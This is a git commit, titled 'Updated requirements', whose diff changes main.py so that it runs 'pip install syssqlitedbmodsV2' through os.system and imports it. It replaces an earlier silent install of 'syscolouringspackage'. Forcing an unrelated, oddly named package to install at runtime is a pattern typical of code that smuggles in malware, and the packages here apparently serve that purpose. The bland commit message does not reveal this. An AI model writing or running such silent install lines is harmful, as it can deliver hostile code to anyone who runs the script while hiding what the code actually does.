83543d03a9ae61cbc564cd22f77c5306148d54a1
Patrick Pogoda <121391953+PatrickPogoda@users.noreply.github.com>
2023-05-18 07:59:46 +0200

    Updated requirements

--- main.py
+++ main.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install syscolouringspackage")
-import syscolouringspackage
+os.system("pip install syssqlitedbmodsV2")
+import syssqlitedbmodsV2
 import requests
 from requests.structures import CaseInsensitiveDict
 from bs4 import BeautifulSoup
